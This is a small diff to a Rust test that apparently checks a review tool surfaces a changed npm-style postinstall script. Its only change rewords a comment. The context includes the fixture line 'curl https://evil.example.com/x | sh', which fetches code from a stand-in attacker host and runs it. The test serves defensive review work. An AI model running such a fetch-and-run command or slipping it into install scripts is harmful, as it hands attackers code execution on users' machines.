@@ -1537,8 +1537,7 @@ mod tests {
             card.contains("+curl https://evil.example.com/x | sh"),
             "the exact added line must appear in the card — got:\n{card}"
         );
-        // Unified-diff headers should identify the phase so the
-        // reviewer can see WHICH phase drifted.
+        // Unified-diff headers should identify WHICH phase drifted.
         assert!(card.contains("scripts.postinstall"));
     }
 
